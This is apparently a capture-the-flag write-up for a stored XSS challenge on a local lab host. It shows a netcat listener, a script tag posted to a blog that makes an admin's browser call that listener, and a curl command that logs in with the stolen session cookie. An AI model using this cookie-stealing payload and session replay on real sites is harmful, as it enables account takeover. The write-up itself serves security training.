# XSS 7.md

Previous solution doesn't work, as posting by admin is disallowed. So have to login as admin to see drafts.

Set up a listener:

```shell
nc -l -v challenge.localhost 20000
```

Craft a post to steal cookie:

```html
<script>
window.onload = async function() {
    try {
        await fetch("http://challenge.localhost:20000", {
            method: "GET",
            credentials: "include" 
        });
    } catch (error) {
        console.error("Error:", error);
    }
};
</script>
```

After getting the cookie, login:

```shell
curl -v --cookie "<stolen-cookie>"  http://challenge.localhost/
```
